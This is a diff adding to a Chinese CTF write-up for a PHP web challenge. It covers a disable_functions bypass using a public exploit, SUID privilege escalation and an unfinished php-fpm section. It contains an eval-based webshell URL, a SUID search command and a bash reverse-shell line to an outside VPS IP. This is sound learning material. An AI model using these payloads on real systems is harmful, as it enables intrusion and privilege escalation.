@@ -4,7 +4,16 @@
 
 ## 考点
 
+* PHP整数溢出绕过数组赋值
+* disable\_functions bypass
+* open\_basedir bypass
+* SUID提权
+* PHP提权
+* 攻击 php-fpm 绕过 disable\_functions
+
 ## wp
+
+### 我的想法
 
 给了源码，代码比较少，`user.php`定义了`User`类，有一个`count`属性
 
@@ -57,3 +66,32 @@ disable\_functions过滤了很多东西，并且设置了`open_basedir`是`/var/
 
 ![](<../../.gitbook/assets/image (11).png>)
 
+可以使用蚁剑连接shell，URL为`http://386b04f5-3788-4ff5-ae86-1d103baecdb7.node4.buuoj.cn:81/add_api.php?backdoor=eval($_POST["cmd"]);`，密码为`cmd`，再加上请求头
+
+![](<../../.gitbook/assets/image (9).png>)
+
+调用虚拟终端，输入ls，返回的内容是ret=127，意思是没有权限，然后就要绕过了
+
+![](<../../.gitbook/assets/image (24).png>)
+
+可以使用[PHP 7.0-8.0 disable\_functions bypass \[user\_filter\]](https://github.com/mm0r1/exploits/tree/master/php-filter-bypass)进行绕过，这个只能进行命令执行，没办法代码执行。然后读取flag失败，发现只有root可以读取
+
+![](<../../.gitbook/assets/image (22).png>)
+
+最后就是Linux提权，经典尝试suid提权。先查看具有root用户权限的SUID文件
+
+在蚁剑的shell执行`find / -perm -u=s -type f 2>/dev/null`没有显示任何东西，再试试把[PHP 7.0-8.0 disable\_functions bypass \[user\_filter\]](https://github.com/mm0r1/exploits/tree/master/php-filter-bypass)的exp.php复制到/var/www/html下访问就可以看到结果了
+
+![](<../../.gitbook/assets/image (34).png>)
+
+有个/usr/local/bin/php，它是具有root权限的，并且当前用户可以使用php -a进入交互模式。但是蚁剑的shell没办法进行交互，浏览器更不行，所以考虑把shell反弹。在蚁剑执行`bash -c 'sh -i >& /dev/tcp/81.68.218.54/44444 0>&1'` 在VPS接收
+
+![](<../../.gitbook/assets/image (29).png>)
+
+然后进入PHP交互模式，绕过open\_basedir读取flag
+
+![](<../../.gitbook/assets/image (19).png>)
+
+### 攻击 php-fpm 绕过 disable\_functions（未完成）
+
+在phpinfo可以看到是以FPM/FastCGI模式启动。
